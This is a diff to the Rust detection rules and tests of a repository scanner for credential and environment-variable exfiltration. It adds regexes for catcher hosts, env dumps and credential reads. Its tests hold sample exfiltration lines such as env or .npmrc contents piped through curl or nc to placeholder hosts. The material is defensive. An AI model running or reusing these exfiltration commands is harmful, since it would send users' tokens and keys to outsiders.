@@ -13,13 +13,13 @@ use crate::{FileCtx, FileKind, Finding, Group, Lang, Severity};
 // The patterns spell their dots as `[.]` and break up their own keywords, so this file does not
 // match the rules it holds when the repo scans itself.
 
-/// Chat services bots post to by design: a webhook or a bot URL is MEDIUM unless more shows it
-/// carries secrets.
+/// Hosts that bots and dev servers use by design (chat webhooks, bot URLs, ngrok tunnels): a mention
+/// is MEDIUM unless a send is near and the file also reads secrets.
 fn chat_hosts() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot",
+        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot|\bngrok(?:-free)?[.](?:io|app)\b",
     )
 }
 
@@ -28,7 +28,7 @@ fn catcher_hosts() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"(?i)\bwebhook[.]site\b|\btransfer[.]sh\b|\bngrok(?:-free)?[.](?:io|app)\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
+        r"(?i)\bwebhook[.]site\b|\btransfer[.]sh\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
     )
 }
 
@@ -40,11 +40,14 @@ fn credential_paths() -> &'static Regex {
     )
 }
 
+/// A copy of the whole environment: a JSON dump, a spread, `Object.assign({}, ...)`, the entries
+/// or keys, Python's `dict(os.environ)` or `.copy()`, and `printenv` or `env` piped to a sender or
+/// substituted into its arguments. One variable (`process.env.HOME`, `printenv HOME`) is not.
 fn env_dumps() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"JSON[.]stringify\(\s*process[.]env|dict\(os[.]environ\)",
+        r"JSON[.]stringify\(\s*process[.]env|\{\s*[.][.][.]\s*process[.]env|Object[.]assign\(\s*\{\s*\}\s*,\s*process[.]env\s*\)|Object[.](?:entries|keys|values)\(\s*process[.]env\s*\)|dict\(os[.]environ\)|os[.]environ[.](?:copy|items|keys|values)\(\s*\)|(?:^|[\s;&(`])(?:printenv|env)\s*\|(?:[^\n|]*\|)*\s*(?:curl|wget|nc|ncat)\b|\b(?:curl|wget)\b[^\n]*(?:\$\(|`)\s*(?:printenv|env)\s*(?:\)|`)",
     )
 }
 
@@ -85,8 +88,20 @@ fn read_calls() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"\b(?:read\w*|open\w*|createReadStream|cat|cp|copy\w*|file_get_contents|Get-Content|slurp)\b",
+        r"\b(?:readFile\w*|readSync|readlines?|read_text|read_bytes|createReadStream|file_get_contents|open|cat|cp|copyFile\w*|ReadFile)\b|\bfs[.]read\w*|\bFile[.]read\w*|Get-Content",
     )
+}
+
+/// The `type` command of a batch file, which prints a file.
+fn type_command() -> &'static Regex {
+    static CELL: OnceLock<Regex> = OnceLock::new();
+    cached(&CELL, r"(?i)\btype\s+\S")
+}
+
+/// A shell input redirection that ends the text before a path: `< path`, `$(<path)`.
+fn redirect_before() -> &'static Regex {
+    static CELL: OnceLock<Regex> = OnceLock::new();
+    cached(&CELL, r#"(?:^|[^<>])<\s*["']?[^\s"'<>]*$"#)
 }
 
 fn miners() -> &'static Regex {
@@ -172,6 +187,45 @@ fn send_near(text: &str, at: usize) -> bool {
     send_calls().is_match(lines_around(text, at, NEAR, NEAR))
 }
 
+/// Said in the `why` of a MEDIUM finding that the raise for reached files lifts to HIGH: the
+/// finding has the shape of a theft (a read and a send, an environment dump and a send, a post to a
+/// chat service) and is MEDIUM only because nothing is known to run the file.
+const RAISE_NOTE: &str = " It is MEDIUM because nothing is known to run this file; it is HIGH when an install script, a build step or an editor task runs it.";
+
+fn why_with_note(why: &str, note: bool) -> String {
+    if note {
+        format!("{why}{RAISE_NOTE}")
+    } else {
+        why.to_string()
+    }
+}
+
+/// Whether the credential path at `at` is read: a read call within 3 lines, or an input
+/// redirection right before it.
+fn is_read(text: &str, at: usize, lang: Lang) -> bool {
+    let window = lines_around(text, at, READ_NEAR, READ_NEAR);
+    let line_start = text[..at].rfind('\n').map_or(0, |i| i + 1);
+    read_calls().is_match(window)
+        || (lang == Lang::Bat && type_command().is_match(window))
+        || redirect_before().is_match(&text[line_start..at])
+}
+
+/// Whether the path at `at` is part of a container bind or mount spec (`-v host:/root/.npmrc`,
+/// `--mount type=bind,source=x,target=/root/.npmrc`): a path inside a container, not a read of
+/// the host credential.
+fn is_bind_spec(text: &str, at: usize) -> bool {
+    let delimiter = |c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '`' | ',');
+    let start = text[..at].rfind(delimiter).map_or(0, |i| {
+        i + text[i..].chars().next().map_or(1, char::len_utf8)
+    });
+    let end = text[at..].find(delimiter).map_or(text.len(), |i| at + i);
+    let token = &text[start..end];
+    (token.contains(":/") && !token.contains("://"))
+        || ["target=", "dst=", "destination=", "source=", "src="]
+            .iter()
+            .any(|key| token.contains(key))
+}
+
 fn emit(f: &FileCtx, text: &str, hits: &Hits, rule: &Rule, out: &mut Vec<Finding>) {
     out.extend(report(f, text, hits, rule));
 }
@@ -183,7 +237,9 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
     let catchers = hits_of(catcher_hosts(), text);
     // A chat URL is HIGH when it is sent to and the file also reads the environment or a token.
     let (chat, sent) = graded_hits(chat_hosts(), text, |at| send_near(text, at));
-    let reads_secrets = secret_reads().is_match(text) || credential_paths().is_match(text);
+    let reads_secrets = env_dumps().is_match(text)
+        || secret_reads().is_match(text)
+        || credential_paths().is_match(text);
     let high = catchers.first.is_some() || (sent && !test && reads_secrets);
     let first = match (catchers.first, chat.first) {
         (Some(a), Some(b)) => Some(a.min(b)),
@@ -193,6 +249,7 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
         first,
         count: catchers.count + chat.count,
     };
+    let why = why_with_note(WEBHOOK_WHY, !high);
     let rule = Rule {
         group: Group::Exfil,
         id: "exfil.webhook",
@@ -201,22 +258,24 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
         } else {
             Severity::Medium
         },
-        why: WEBHOOK_WHY,
+        why: &why,
         action: WEBHOOK_ACTION,
     };
     emit(f, text, &hits, &rule, out);
 }
 
-/// Raises every MEDIUM `exfil.*` finding of a file that an auto-run surface reaches to HIGH. The
-/// test-path and comment caps, and the chat-webhook ruling, exist for files that only sit in the
-/// tree: a script that runs on install and posts to a chat service, or reads `.npmrc` from a file
-/// under `test/`, is not a bot or a fixture. The orchestrator calls this once with the set of
-/// reached paths and the findings it collected; other groups are not touched.
+/// Raises the MEDIUM `exfil.*` findings of a file that an auto-run surface reaches to HIGH, when
+/// the finding carries `RAISE_NOTE`: it has the shape of a theft (a read and a send, an
+/// environment dump and a send, a post to a chat service) and is MEDIUM only for a test path or the
+/// chat-webhook ruling. Those exist for files that only sit in the tree: a script that runs on
+/// install and posts to a chat service, or reads `.npmrc` from a file under `test/`, is not a bot or
+/// a fixture. A mention in a comment, a bind spec or a dump with no flow is not lifted. The
+/// orchestrator calls this once with the set of reached paths and the findings it collected;
+/// other groups are not touched.
 pub(crate) fn raise_reached(findings: &mut [Finding], reached: &ReachedTest<'_>) {
-    for finding in findings
-        .iter_mut()
-        .filter(|x| x.group == Group::Exfil && x.severity == Severity::Medium)
-    {
+    for finding in findings.iter_mut().filter(|x| {
+        x.group == Group::Exfil && x.severity == Severity::Medium && x.why.contains(RAISE_NOTE)
+    }) {
         if reached(&finding.path) {
             finding.severity = Severity::High;
         }
@@ -224,23 +283,30 @@ pub(crate) fn raise_reached(findings: &mut [Finding], reached: &ReachedTest<'_>)
 }
 
 fn cred_path(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
-    // HIGH needs the path in code, read near by a call, with a send within 10 lines: a doc comment,
-    // a help string or a test fixture that names `.npmrc` is not a theft.
-    let (hits, strong) = graded_hits(credential_paths(), text, |at| {
-        !test
-            && !in_comment(text, at, lang)
-            && read_calls().is_match(lines_around(text, at, READ_NEAR, READ_NEAR))
+    // The shape of a theft: the path in code (not a comment, not a container bind or mount spec),
+    // the argument of a read, with a send within 10 lines. A doc comment, a help string or a
+    // `docker run -v` mount of `.npmrc` is not one. In a test path the shape is MEDIUM, and a run
+    // of the file raises it.
+    let (hits, theft) = graded_hits(credential_paths(), text, |at| {
+        !in_comment(text, at, lang)
+            && !is_bind_spec(text, at)
+            && is_read(text, at, lang)
             && send_near(text, at)
     });
+    let high = theft && !test;
+    let why = why_with_note(
+        "The script names a place where credentials live (SSH keys, cloud or registry tokens, browser or wallet data). With a read and a send close by, this is how they leave.",
+        theft && test,
+    );
     let rule = Rule {
         group: Group::Exfil,
         id: "exfil.cred-path",
-        severity: if strong {
+        severity: if high {
             Severity::High
         } else {
             Severity::Medium
         },
-        why: "The script names a place where credentials live (SSH keys, cloud or registry tokens, browser or wallet data). With a read and a send close by, this is how they leave.",
+        why: &why,
         action: "Read what the script does with the file before you run it.",
     };
     emit(f, text, &hits, &rule, out);
@@ -249,24 +315,26 @@ fn cred_path(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Find
 fn env_dump(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
     // HIGH when the dump flows to a send or a file write within 10 lines. A dump in a file that
     // talks to the network elsewhere, or in a test, is MEDIUM; a dump with no network is clean.
-    let (hits, strong) = graded_hits(env_dumps(), text, |at| {
+    let (hits, flow) = graded_hits(env_dumps(), text, |at| {
         let near = lines_around(text, at, NEAR, NEAR);
-        !test
-            && !in_comment(text, at, lang)
-            && (send_calls().is_match(near) || write_calls().is_match(near))
+        !in_comment(text, at, lang) && (send_calls().is_match(near) || write_calls().is_match(near))
     });
-    let severity = if strong {
+    let severity = if flow && !test {
         Severity::High
-    } else if network_words().is_match(text) || send_calls().is_match(text) {
+    } else if flow || network_words().is_match(text) || send_calls().is_match(text) {
         Severity::Medium
     } else {
         return;
     };
+    let why = why_with_note(
+        "The script reads the whole environment, where tokens and keys are. With a send or a file write close by, the environment leaves the process.",
+        flow && test,
+    );
     let rule = Rule {
         group: Group::Exfil,
         id: "exfil.env-dump",
         severity,
-        why: "The script reads the whole environment, where tokens and keys are. With a send or a file write close by, the environment leaves the process.",
+        why: &why,
         action: "Do not run it: read where the environment goes first.",
     };
     emit(f, text, &hits, &rule, out);
@@ -385,15 +453,7 @@ mod tests {
 
     #[test]
     fn request_catcher_hosts_are_high_in_any_code() {
-        let all = [
-            WEBHOOK_SITE,
-            TRANSFER,
-            NGROK,
-            NGROK_FREE,
-            OAST,
-            INTERACT,
-            PIPEDREAM,
-        ];
+        let all = [WEBHOOK_SITE, TRANSFER, OAST, INTERACT, PIPEDREAM];
         for host in all {
             let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
             for lang in [Lang::Js, Lang::Rs, Lang::Go] {
@@ -430,7 +490,7 @@ mod tests {
             METAMASK,
             EXODUS,
         ] {
-            let t = format!("const p = '{path}';\nread(p);\n");
+            let t = format!("const p = '{path}';\nfs.readFileSync(p);\n");
             let v = code(Lang::Js, &t);
             let f = one(&v, "exfil.cred-path");
             assert_eq!(
@@ -438,7 +498,9 @@ mod tests {
                 (Severity::Medium, Group::Exfil, 1),
                 "{path}"
             );
-            let t = format!("{t}fetch('https://example.invalid/up', {{ body: read(p) }});\n");
+            let t = format!(
+                "{t}fetch('https://example.invalid/up', {{ body: fs.readFileSync(p) }});\n"
+            );
             assert_eq!(
                 one(&code(Lang::Js, &t), "exfil.cred-path").severity,
                 Severity::High,
@@ -486,7 +548,7 @@ mod tests {
         );
         // A read call far from the path is not a read of it.
         let far = format!(
-            "const p = '{SSH_KEY}';\n{}read(p);\n{send}",
+            "const p = '{SSH_KEY}';\n{}fs.readFileSync(p);\n{send}",
             "x();\n".repeat(10)
         );
         assert_eq!(
@@ -594,6 +656,101 @@ mod tests {
     }
 
     #[test]
+    fn a_comment_marker_in_a_string_or_a_regex_does_not_hide_a_theft() {
+        // N4: an attacker puts a `//` or a `#` earlier on the line, inside a literal.
+        for line in [
+            format!("const a = \"//\"; const k = fs.readFileSync('{NPMRC}');"),
+            format!("const re = /\\/\\//; const k = fs.readFileSync('{NPMRC}');"),
+            format!("const u = 'http://x'; const k = fs.readFileSync('{NPMRC}');"),
+        ] {
+            let t = format!("{line}\nfetch(u, {{ body: k }});\n");
+            let v = code(Lang::Js, &t);
+            assert_eq!(
+                one(&v, "exfil.cred-path").severity,
+                Severity::High,
+                "{line}"
+            );
+        }
+        let py = format!("s = '#'; k = open('{AWS_CREDS}').read()\nrequests.post(u, data=k)\n");
+        assert_eq!(
+            one(&code(Lang::Py, &py), "exfil.cred-path").severity,
+            Severity::High
+        );
+        let dump = "const a = \"//\"; fetch(u, { body: JSON.stringify(process.env) });\n";
+        assert_eq!(
+            one(&code(Lang::Js, dump), "exfil.env-dump").severity,
+            Severity::High
+        );
+        // A real comment still caps the finding.
+        let real = format!("const k = 1; // fs.readFileSync('{NPMRC}')\nfetch(u);\n");
+        assert_eq!(
+            one(&code(Lang::Js, &real), "exfil.cred-path").severity,
+            Severity::Medium
+        );
+    }
+
+    #[test]
+    fn the_wider_environment_dumps_that_reach_a_send_are_high() {
+        let js = [
+            "const body = JSON.stringify({ ...process.env });",
+            "const body = { ...process.env };",
+            "const body = Object.assign({}, process.env);",
+            "const body = Object.entries(process.env);",
+            "const body = Object.keys( process.env );",
+        ];
+        for dump in js {
+            let t = format!("{dump}\nfetch('https://example.invalid/', {{ body }});\n");
+            let v = code(Lang::Js, &t);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{dump}");
+        }
+        for dump in [
+            "body = os.environ.copy()",
+            "body = dict(os.environ)",
+            "body = os.environ.items()",
+        ] {
+            let t = format!("{dump}\nrequests.post(u, json=body)\n");
+            let v = code(Lang::Py, &t);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{dump}");
+        }
+        for sh in [
+            "printenv | curl -d @- https://example.invalid/",
+            "env | curl -d @- https://example.invalid/",
+            "env | base64 | curl -d @- https://example.invalid/",
+            "curl -d \"$(printenv)\" https://example.invalid/",
+            "curl --data \"$(env)\" https://example.invalid/",
+            "wget --post-data=\"`printenv`\" https://example.invalid/",
+            "cd x; printenv | nc 203.0.113.9 80",
+        ] {
+            let v = code(Lang::Sh, &format!("{sh}\n"));
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{sh}");
+        }
+    }
+
+    #[test]
+    fn reading_a_variable_or_piping_a_command_that_is_not_a_dump_is_clean() {
+        for js in [
+            "fetch(u, { body: process.env.HOME });",
+            "const { PATH } = process.env; fetch(u, { body: PATH });",
+            "const o = { ...options }; fetch(u, o);",
+        ] {
+            assert!(code(Lang::Js, &format!("{js}\n")).is_empty(), "{js}");
+        }
+        for sh in [
+            "printenv HOME | curl -d @- https://example.invalid/",
+            "env FOO=1 node a.js | tee log",
+            "cat env.txt | curl -d @- https://example.invalid/",
+            "curl -d \"$(hostname)\" https://example.invalid/",
+        ] {
+            let v = code(Lang::Sh, &format!("{sh}\n"));
+            assert!(
+                v.iter().all(|f| f.rule != "exfil.env-dump"),
+                "{sh}: {:?}",
+                rules(&v)
+            );
+        }
+    }
+
+    #[test]
     fn a_miner_marker_is_high_in_any_code() {
         for marker in [STRATUM, MINER_BIN, DONATE] {
             for lang in [Lang::Sh, Lang::Go, Lang::Js] {
@@ -685,8 +842,8 @@ mod tests {
 
     #[test]
     fn a_chat_webhook_alone_is_medium() {
-        // Bot repos post to Discord and Telegram by design.
-        for host in [DISCORD, DISCORDAPP, TELEGRAM] {
+        // Bot repos post to Discord and Telegram by design; dev servers sit behind ngrok.
+        for host in [DISCORD, DISCORDAPP, TELEGRAM, NGROK, NGROK_FREE] {
             let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
             for lang in [Lang::Js, Lang::Rs, Lang::Py] {
                 let v = code(lang, &t);
@@ -786,9 +943,9 @@ mod tests {
     }
 
     #[test]
-    fn a_reached_file_loses_the_test_path_and_comment_caps() {
+    fn a_reached_file_loses_the_test_path_cap() {
         // A test-folder script that reads and sends a credential is MEDIUM on its own and HIGH
-        // when something runs it; so is an environment dump and a comment-only mention.
+        // when something runs it; so is an environment dump that flows to a send.
         let t = format!(
             "const k = fs.readFileSync('{NPMRC}');\nfetch(u, {{ body: k }});\nconst e = JSON.stringify(process.env);\nfetch(u, {{ body: e }});\n"
         );
@@ -798,11 +955,104 @@ mod tests {
         raise_reached(&mut v, &|path| path == "test/x.js");
         assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
         assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High);
-        let c = format!("// reads {NPMRC}\nfetch(u);\n");
-        let mut v = run("src/c.js", FileKind::Code(Lang::Js), &c);
+    }
+
+    #[test]
+    fn a_reached_file_keeps_a_comment_a_bind_spec_and_a_dump_with_no_flow_at_medium() {
+        let send = "fetch('https://example.invalid/up');\n";
+        let comment = format!("// reads {NPMRC}\n{send}");
+        let bind = format!(
+            "const args = ['run', '-v', `${{process.env['X']}}:/root/{}`];\nfs.readFileSync('package.json');\n{send}",
+            ".npmrc"
+        );
+        let shell = format!(
+            "docker run -v $HOME/.npmrc:/root/.npmrc img\ncat notes.txt\ncurl {WEBHOOK_SITE}\n"
+        );
+        let far_dump = format!(
+            "const e = JSON.stringify(process.env);\n{}fetch(u);\n",
+            "// filler\n".repeat(40)
+        );
+        for (text, rule) in [
+            (comment, "exfil.cred-path"),
+            (bind, "exfil.cred-path"),
+            (far_dump, "exfil.env-dump"),
+        ] {
+            let mut v = run("src/c.js", FileKind::Code(Lang::Js), &text);
+            assert_eq!(one(&v, rule).severity, Severity::Medium, "{text}");
+            raise_reached(&mut v, &|_| true);
+            assert_eq!(one(&v, rule).severity, Severity::Medium, "{text}");
+        }
+        let mut v = run("run.sh", FileKind::Code(Lang::Sh), &shell);
         assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
         raise_reached(&mut v, &|_| true);
-        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
+    }
+
+    #[test]
+    fn a_credential_path_in_a_bind_or_mount_spec_is_not_a_read() {
+        // vscode shape (build/npm/postinstall): a docker run argv that mounts the npm config of
+        // the host into the container, passes a token with -e, and sits near other reads and sends.
+        let argv = format!(
+            "const args = [\n  'run',\n  ...fs.readFileSync('flags.txt', 'utf8').split('\\n'),\n  '-v', `${{process.env['NPMRC_PATH']}}:/root/{}`,\n  '-e', 'GITHUB_TOKEN',\n  image,\n];\nspawn('docker', args);\nfetch('https://example.invalid/status');\n",
+            ".npmrc"
+        );
+        let v = code(Lang::Js, &argv);
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
+        for line in [
+            "docker run -v ~/.npmrc:/root/.npmrc img",
+            "docker run --volume $HOME/.npmrc:/root/.npmrc img",
+            "docker run --mount type=bind,source=/h/x,target=/root/.npmrc img",
+            "docker run --mount type=bind,source=~/.npmrc,target=/c img",
+        ] {
+            let t = format!("cat versions.txt\n{line}\ncurl https://example.invalid/\n");
+            let v = code(Lang::Sh, &t);
+            assert_eq!(
+                one(&v, "exfil.cred-path").severity,
+                Severity::Medium,
+                "{line}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_path_that_is_the_argument_of_a_read_is_high() {
+        let send = "fetch('https://example.invalid/up');\n";
+        for read in [
+            format!("const k = fs.readFileSync('{NPMRC}');"),
+            format!("const k = readFile('{NPMRC}');"),
+            format!("k = open('{NPMRC}').read()"),
+            format!("const k = fs.readSync(fd, '{NPMRC}');"),
+            format!("k = File.read('{NPMRC}')"),
+            format!("k, _ := os.ReadFile(\"{NPMRC}\")"),
+            format!("k = Path('{NPMRC}').read_text()"),
+        ] {
+            let t = format!("{read}\n{send}");
+            let v = code(Lang::Js, &t);
+            assert_eq!(
+                one(&v, "exfil.cred-path").severity,
+                Severity::High,
+                "{read}"
+            );
+        }
+        for sh in [
+            format!("cat {NPMRC} | curl -d @- https://example.invalid/"),
+            format!("curl -d \"$(<{NPMRC})\" https://example.invalid/"),
+            format!("curl -d @- https://example.invalid/ < {NPMRC}"),
+        ] {
+            let v = code(Lang::Sh, &sh);
+            assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High, "{sh}");
+        }
+        let bat = format!("type {NPMRC}\ncurl https://example.invalid/\n");
+        assert_eq!(
+            one(&code(Lang::Bat, &bat), "exfil.cred-path").severity,
+            Severity::High
+        );
+        // The word `type` is not a read outside a batch file.
+        let ts = format!("type A = {{ p: '{NPMRC}' }};\n{send}");
+        assert_eq!(
+            one(&code(Lang::Js, &ts), "exfil.cred-path").severity,
+            Severity::Medium
+        );
     }
 
     #[test]
